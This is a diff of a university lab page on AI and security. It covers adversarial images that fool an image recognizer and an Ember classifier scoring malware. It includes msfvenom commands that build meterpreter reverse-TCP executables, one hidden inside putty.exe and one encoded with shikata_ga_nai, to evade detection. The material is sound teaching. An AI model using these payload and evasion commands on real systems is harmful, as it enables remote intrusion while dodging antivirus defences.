@@ -1,10 +1,12 @@
 # Lab 10: AI
 
+{% hint style="warning" %}
+PLEASE NOTE: This lab image uses a lot of storage space (image size is 2.2GB, storage size is almost 4GB!), so ensure you have enough space on your hard drive before proceeding.
+{% endhint %}
+
 Walkthrough video:
 
 **AI 10-1** [https://www.youtube.com/watch?v=6LhD8jUO1aY](https://www.youtube.com/watch?v=6LhD8jUO1aY)
-
-## (NOT READY)
 
 ## Intro to AI and Cybersecurity
 
@@ -35,16 +37,16 @@ docker run -v /projects/share:/opt/share -it uwacyber/cits1003-labs:ai
 
 {% tab title="Apple Silicon" %}
 ```
-Tensorflow won't work on ARM (the last time we checked) and 
-so you will have to skip this bit - do the lab with a friend 
-or ask the facilitator.
+# It is quite complicated to build an ARM64 image using tensorflow, 
+# so work with your friend and/or get help from the lab facilitators for
+# this task. You can do the next task as usual.
 ```
 {% endtab %}
 {% endtabs %}
 
-The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it.
+The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it (change the path as you wish).
 
-Once on the docker container, go to the directory `/opt/adversarial/share`. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes for a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).
+Once on the docker container, go to the directory `/opt/adversarial/share`. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes from a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).
 
 To run the script we do so as follows:
 
@@ -99,7 +101,7 @@ Note the Wolfram site only works intermittently - it isn't reliable. If you can'
 
 Back on your own machine, these files should be in the directory you specified to share with the docker container. We are now going to test these out on an image recognition program run by Wolfram which is here [https://www.imageidentify.com](https://www.imageidentify.com)
 
-Load the first image, `Input.jpg`, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with Epsilon = 0.010.jpg and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image which has had the most perturbations applied to it.
+Load the first image, `Input.jpg`, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with `Epsilon = 0.010.jpg` and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image (or misclassify) which has had the most perturbations applied to it.
 
 ### Question 1. Enter the wrong dog
 
@@ -117,9 +119,9 @@ Try the same attack but this time using another picture - one of a bear:
 
 ![This is a bear](../.gitbook/assets/bear.jpg)
 
-You can right click on this and save it to your share folder and then run the program again. You might see the confidence dropping, but the prediction should still be the same - a brown bear. Obviously not all photos/pictures are well equipped for the perturbations applied using the provided exploit code, but there are many other libraries available that performs better perturbations.
+You can right click on this and save it to your share folder and then run the program again. You might see the confidence dropping, but the prediction should still be the same - a brown bear. Obviously not all photos/pictures are well equipped for the perturbations applied using the provided exploit code, but there are many other libraries available that perform better perturbations.
 
-Try with your own images - they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.
+Try with your own images - note that they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.
 
 ## Malware recognition with Ember
 
@@ -147,9 +149,9 @@ The script `classify_binary.py` takes the trained model as an argument and the b
 This \*is\* real malware - do not download to your PC or try and execute
 {% endhint %}
 
-The malware is actually Trickbot, which is a banking trojan.
+The malware is actually _Trickbot_, which is a banking trojan.
 
-We can now try with a normal Windows program git.exe
+We can now try with a normal Windows program `git.exe`
 
 ```bash
 root@863da6f82693:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt git.exe
@@ -179,12 +181,20 @@ In other words, a practically 0 score for it being malware.
 
 `Msfvenom` comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially machine learning classifiers.
 
-To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:
+To get started, we are going to run Metasploit. But firstly, we will create a local volume that we can attach to different containers - this is due to the files we are about to create will most likely be filtered automatically by your firewall. So let's create a temporary volume. In your PowerShell/termial:
+
+```
+docker volume create volume1
+```
+
+This will create a local volume named `volume1`, you can check by `docker volume ls`. Now we can attach this volume instead of host's local drive and share files between containers.
+
+Let's run a Docker container as follows:
 
 {% tabs %}
 {% tab title="Windows" %}
 ```bash
-docker run -v C:/projects/share:/opt/share -it uwacyber/cits1003-labs:metasploit
+docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
 ```
 {% endtab %}
 
@@ -201,15 +211,23 @@ docker run -v $(pwd)/share:/opt/share -it uwacyber/cits1003-labs:metasploit
 {% endtab %}
 {% endtabs %}
 
-Instead of `/projects/share` put the same local folder you were running for the AI container above.
+this will create a folder called `volume1` in the root directory (you can name this something else e.g., `volume1:/extra`), which is attached to the local volume `volume1`.
 
-Once this is running, you can type
+Then, we are going to need a file called `putty.exe` that we are going to use as a template for one of the Meterpreter versions. If you have a shared folder between the container and the host, download it by going to the address below and save it to the directory you have shared with the container (you can paste the link in the browser to download, and save it into the shared folder):
+
+```bash
+https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
+```
+
+Alternatively (e.g., using the shared local volume approach), you can use `wget` to download directly from docker (and move it into the shared folder). You would need to `apt-get update` and `apt-get install wget` on the container. I have saved this file in the `/opt` folder.
+
+Now, we can run Metasploit by typing:
 
 ```bash
 msfconsole
 ```
 
-and answer yes to the following question and no to the second.
+If you are asked questions, answer yes to the first question (set up a new database) and no to the second (init the web service).
 
 After doing that, you should see something like this (the actual graphic changes each time):
 
@@ -266,37 +284,44 @@ msf6 >
 
 The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :)
 
-We are going to need a file called `putty.exe` that we are going to use as a template for one of the Meterpreter versions and so download it now to the directory you have shared with the container:
-
-```bash
-https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
-```
-
 We are going to run `msfvenom` from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > /opt/share/meterpreter1.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
+-f exe > /volume1/meterpreter1.exe
 ```
 
-You don't really have to worry about the parameters but if you are interested, the `LHOST` and `LPORT` arguments tell Meterpreter where to connect back to i.e. our machine. The `-f exe` tells Meterpreter that we are using an executable format for the payload.
+You don't really have to worry about the parameters but if you are interested, the `LHOST` and `LPORT` arguments tell Meterpreter where to connect back to (i.e. our machine). We haven't set up a listener on port 4443 and our executable actually doesn't send back anything, so these values are just there as a space holder. The `-f exe` tells Meterpreter that we are using an executable format for the payload.
 
-Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. Run the `msfvenom` command as follows:
+Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable `putty.exe`. Putty is an application that allows SSH connections on a Windows box. I have saved `putty.exe` in the `/opt` directory. Run the `msfvenom` command as follows:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x /opt/share/putty.exe > /opt/share/meterpreter2.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
+-f exe -x /opt/putty.exe > /volume1/meterpreter2.exe
 ```
 
-Now that we have the two samples, we can go back to our classifier and see what happens:
-
-With the first version `meterpreter1.exe` we get:
+Moreover, `Msfvenom` has other encoders that try and obfuscate the file to avoid detection. One of these is called `shikata ga nai`. You can create a meterpreter binary using the flag:
 
 ```bash
-root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter1.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
+-f exe -e x86/shikata_ga_nai > /volume1/meterpreter3.exe
+```
+
+Now that we have the three different samples, we can go back to our classifier in the `ai` container and see what happens. Launch the ai container with the `volume1` attached (it will be a new container instance of ai image):
+
+```
+docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai
+```
+
+I have moved the meterpreter files into the `/opt/ember` directory. With the first version `meterpreter1.exe` we get:
+
+```bash
+root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter1.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
 Signature PDB_20 is not implemented yet!
-0.9999986237635949
+0.9999979600610946
 ```
 
 Definitely malware!
@@ -304,28 +329,33 @@ Definitely malware!
 However, when we run the second version, we get:
 
 ```bash
-root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter2.exe
+root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter2.exe
 WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
 WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
 WARNING:   in the feature calculations.
-0.015146771950010027
+0.00907516308707395
 ```
 
-So, according to the classifier, this is a normal, and safe, binary!
+So, according to the classifier, this is likely be a normal, and safe, binary/executable!
 
-`Msfvenom` has other encoders that try and obfuscate the file to avoid detection. One of these is called `shikata ga nai`. You can create a meterpreter binary using the flag
+And for the last one:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e x86/shikata_ga_nai > /opt/share/meterpreter3.exe
+root@cb69acf0fc22:/opt/ember# python scripts/classify_binaries.py -m ember_model_2018.txt meterpreter3.exe
+WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
+WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
+WARNING:   in the feature calculations.
+Signature PDB_20 is not implemented yet!
+0.9999973876606032
 ```
 
-However, when you classify this one, you will see that it is still recognised as malware.
+Well, this one is still recognised as malware. Obviously, this encoder is not a good fit for the executable we are generating!
 
 It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than with images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that.
 
 ### Question 3. Who is Metasploit?
 
-**Flag: Type in whoami in the msf console and type in the username as the flag**
+**Flag: a new user has been added in the Metasploit container with the root privileges. The username is the flag.**
 
 If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there.
 
